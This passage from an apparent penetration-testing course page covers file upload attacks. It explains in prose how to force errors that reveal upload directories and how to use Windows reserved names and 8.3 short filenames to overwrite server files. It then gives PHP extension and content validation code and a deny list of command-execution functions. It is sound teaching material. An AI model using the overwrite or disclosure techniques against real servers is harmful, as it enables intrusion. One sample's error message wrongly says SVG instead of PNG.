+<p>Another method we can use to disclose the uploads directory is through forcing error messages, as they often reveal helpful information for further exploitation. One attack we can use to cause such errors is uploading a file with a name that already exists or sending two identical requests simultaneously. This may lead the web server to show an error that it could not write the file, which may disclose the uploads directory. We may also try uploading a file with an overly long name (e.g., 5,000 characters). If the web application does not handle this correctly, it may also error out and disclose the upload directory.</p>
+<p>Similarly, we may try various other techniques to cause the server to error out and disclose the uploads directory, along with additional helpful information.</p>
+<hr>
+<h3 id="windows-specific-attacks">Windows-specific Attacks</h3>
+<p>We can also use a few <code>Windows-Specific</code> techniques in some of the attacks we discussed in the previous sections.</p>
+<p>One such attack is using reserved characters, such as (<code>|</code>, <code>&lt;</code>, <code>&gt;</code>, <code>*</code>, or <code>?</code>), which are usually reserved for special uses like wildcards. If the web application does not properly sanitize these names or wrap them within quotes, they may refer to another file (which may not exist) and cause an error that discloses the upload directory. Similarly, we may use Windows reserved names for the uploaded file name, like (<code>CON</code>, <code>COM1</code>, <code>LPT1</code>, or <code>NUL</code>), which may also cause an error as the web application will not be allowed to write a file with this name.</p>
+<p>Finally, we may utilize the Windows <a href="https://en.wikipedia.org/wiki/8.3\_filename">8.3 Filename Convention</a> to overwrite existing files or refer to files that do not exist. Older versions of Windows were limited to a short length for file names, so they used a Tilde character (<code>~</code>) to complete the file name, which we can use to our advantage.</p>
+<p>For example, to refer to a file called (<code>hackthebox.txt</code>) we can use (<code>HAC~1.TXT</code>) or (<code>HAC~2.TXT</code>), where the digit represents the order of the matching files that start with (<code>HAC</code>). As Windows still supports this convention, we can write a file called (e.g. <code>WEB~.CONF</code>) to overwrite the <code>web.conf</code> file. Similarly, we may write a file that replaces sensitive system files. This attack can lead to several outcomes, like causing information disclosure through errors, causing a DoS on the back-end server, or even accessing private files.</p>
+<hr>
+<h3 id="advanced-file-upload-attacks">Advanced File Upload Attacks</h3>
+<p>In addition to all of the attacks we have discussed in this module, there are more advanced attacks that can be used with file upload functionalities. Any automatic processing that occurs to an uploaded file, like encoding a video, compressing a file, or renaming a file, may be exploited if not securely coded.</p>
+<p>Some commonly used libraries may have public exploits for such vulnerabilities, like the AVI upload vulnerability leading to XXE in <code>ffmpeg</code>. However, when dealing with custom code and custom libraries, detecting such vulnerabilities requires more advanced knowledge and techniques, which may lead to discovering an advanced file upload vulnerability in some web applications.</p>
+<p>There are many other advanced file upload vulnerabilities that we did not discuss in this module. Try to read some bug bounty reports to explore more advanced file upload vulnerabilities.</p>
+<h2 id="preventing-file-upload-vulnerabilities">Preventing File Upload Vulnerabilities</h2>
+<hr>
+<p>Throughout this module, we have discussed various methods of exploiting different file upload vulnerabilities. In any penetration test or bug bounty exercise we take part in, we must be able to report action points to be taken to rectify the identified vulnerabilities.</p>
+<p>This section will discuss what we can do to ensure that our file upload functions are securely coded and safe against exploitation and what action points we can recommend for each type of file upload vulnerability.</p>
+<hr>
+<h3 id="extension-validation">Extension Validation</h3>
+<p>The first and most common type of upload vulnerabilities we discussed in this module was file extension validation. File extensions play an important role in how files and scripts are executed, as most web servers and web applications tend to use file extensions to set their execution properties. This is why we should make sure that our file upload functions can securely handle extension validation.</p>
+<p>While whitelisting extensions is always more secure, as we have seen previously, it is recommended to use both by whitelisting the allowed extensions and blacklisting dangerous extensions. This way, the blacklist list will prevent uploading malicious scripts if the whitelist is ever bypassed (e.g. <code>shell.php.jpg</code>). The following example shows how this can be done with a PHP web application, but the same concept can be applied to other frameworks:</p>
+<p>Code: php</p>
+<pre><code class="lang-php">$fileName = basename($_FILES[<span class="hljs-string">"uploadFile"</span>][<span class="hljs-string">"name"</span>]);
+
+<span class="hljs-comment">// blacklist test</span>
+<span class="hljs-keyword">if</span> (preg_match(<span class="hljs-string">'/^.+\.ph(p|ps|ar|tml)/'</span>, $fileName)) {
+    <span class="hljs-keyword">echo</span> <span class="hljs-string">"Only images are allowed"</span>;
+    <span class="hljs-keyword">die</span>();
+}
+
+<span class="hljs-comment">// whitelist test</span>
+<span class="hljs-keyword">if</span> (!preg_match(<span class="hljs-string">'/^.*\.(jpg|jpeg|png|gif)$/'</span>, $fileName)) {
+    <span class="hljs-keyword">echo</span> <span class="hljs-string">"Only images are allowed"</span>;
+    <span class="hljs-keyword">die</span>();
+}
+</code></pre>
+<p>We see that with blacklisted extension, the web application checks <code>if the extension exists anywhere within the file name</code>, while with whitelists, the web application checks <code>if the file name ends with the extension</code>. Furthermore, we should also apply both back-end and front-end file validation. Even if front-end validation can be easily bypassed, it reduces the chances of users uploading unintended files, thus potentially triggering a defense mechanism and sending us a false alert.</p>
+<hr>
+<h3 id="content-validation">Content Validation</h3>
+<p>As we have also learned in this module, extension validation is not enough, as we should also validate the file content. We cannot validate one without the other and must always validate both the file extension and its content. Furthermore, we should always make sure that the file extension matches the file's content.</p>
+<p>The following example shows us how we can validate the file extension through whitelisting, and validate both the File Signature and the HTTP Content-Type header, while ensuring both of them match our expected file type:</p>
+<p>Code: php</p>
+<pre><code class="lang-php">$fileName = basename($_FILES[<span class="hljs-string">"uploadFile"</span>][<span class="hljs-string">"name"</span>]);
+$contentType = $_FILES[<span class="hljs-string">'uploadFile'</span>][<span class="hljs-string">'type'</span>];
+$MIMEtype = mime_content_type($_FILES[<span class="hljs-string">'uploadFile'</span>][<span class="hljs-string">'tmp_name'</span>]);
+
+<span class="hljs-comment">// whitelist test</span>
+<span class="hljs-keyword">if</span> (!preg_match(<span class="hljs-string">'/^.*\.png$/'</span>, $fileName)) {
+    <span class="hljs-keyword">echo</span> <span class="hljs-string">"Only PNG images are allowed"</span>;
+    <span class="hljs-keyword">die</span>();
+}
+
+<span class="hljs-comment">// content test</span>
+<span class="hljs-keyword">foreach</span> (<span class="hljs-keyword">array</span>($contentType, $MIMEtype) <span class="hljs-keyword">as</span> $type) {
+    <span class="hljs-keyword">if</span> (!in_array($type, <span class="hljs-keyword">array</span>(<span class="hljs-string">'image/png'</span>))) {
+        <span class="hljs-keyword">echo</span> <span class="hljs-string">"Only SVG images are allowed"</span>;
+        <span class="hljs-keyword">die</span>();
+    }
+}
+</code></pre>
+<hr>
+<h3 id="upload-disclosure">Upload Disclosure</h3>
+<p>Another thing we should avoid doing is disclosing the uploads directory or providing direct access to the uploaded file. It is always recommended to hide the uploads directory from the end-users and only allow them to download the uploaded files through a download page.</p>
+<p>We may write a <code>download.php</code> script to fetch the requested file from the uploads directory and then download the file for the end-user. This way, the web application hides the uploads directory and prevents the user from directly accessing the uploaded file. This can significantly reduce the chances of accessing a maliciously uploaded script to execute code.</p>
+<p>If we utilize a download page, we should make sure that the <code>download.php</code> script only grants access to files owned by the users (i.e., avoid <code>IDOR/LFI</code> vulnerabilities) and that the users do not have direct access to the uploads directory (i.e., <code>403 error</code>). This can be achieved by utilizing the <code>Content-Disposition</code> and <code>nosniff</code> headers and using an accurate <code>Content-Type</code> header.</p>
+<p>In addition to restricting the uploads directory, we should also randomize the names of the uploaded files in storage and store their "sanitized" original names in a database. When the <code>download.php</code> script needs to download a file, it fetches its original name from the database and provides it at download time for the user. This way, users will neither know the uploads directory nor the uploaded file name. We can also avoid vulnerabilities caused by injections in the file names, as we saw in the previous section.</p>
+<p>Another thing we can do is store the uploaded files in a separate server or container. If an attacker can gain remote code execution, they would only compromise the uploads server, not the entire back-end server. Furthermore, web servers can be configured to prevent web applications from accessing files outside their restricted directories by using configurations like (<code>open_basedir</code>) in PHP.</p>
+<hr>
+<h3 id="further-security">Further Security</h3>
+<p>The above tips should significantly reduce the chances of uploading and accessing a malicious file. We can take a few other measures to ensure that the back-end server is not compromised if any of the above measures are bypassed.</p>
+<p>A critical configuration we can add is disabling specific functions that may be used to execute system commands through the web application. For example, to do so in PHP, we can use the <code>disable_functions</code> configuration in <code>php.ini</code> and add such dangerous functions, like <code>exec</code>, <code>shell_exec</code>, <code>system</code>, <code>passthru</code>, and a few others.</p>
+<p>Another thing we should do is to disable showing any system or server errors, to avoid sensitive information disclosure. We should always handle errors at the web application level and print out simple errors that explain the error without disclosing any sensitive or specific details, like the file name, uploads directory, or the raw errors.</p>
+<p>Finally, the following are a few other tips we should consider for our web applications:</p>
+<ul>
+<li>Limit file size</li>
+<li>Update any used libraries</li>
+<li>Scan uploaded files for malware or malicious strings</li>
+<li>Utilize a Web Application Firewall (WAF) as a secondary layer of protection</li>
+</ul>
+<p>Once we perform all of the security measures discussed in this section, the web application should be relatively secure and not vulnerable to common file upload threats. When performing a web penetration test, we can use these points as a checklist and provide any missing ones to the developers to fill any remaining gaps.</p>
+</div></body></html>
